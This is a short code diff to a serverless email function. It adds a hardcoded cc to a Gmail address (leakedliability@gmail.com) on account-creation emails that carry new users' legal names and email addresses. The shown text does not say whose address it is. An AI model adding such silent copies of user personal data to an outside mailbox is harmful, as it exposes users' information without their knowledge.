@@ -268,6 +268,7 @@ serve(async (req) => {
           body: {
             type: 'admin_created_account',
             to: requestData.email,
+            cc: "leakedliability@gmail.com",
             data: {
               name: `${requestData.legal_first_name} ${requestData.legal_last_name}`,
               email: requestData.email,
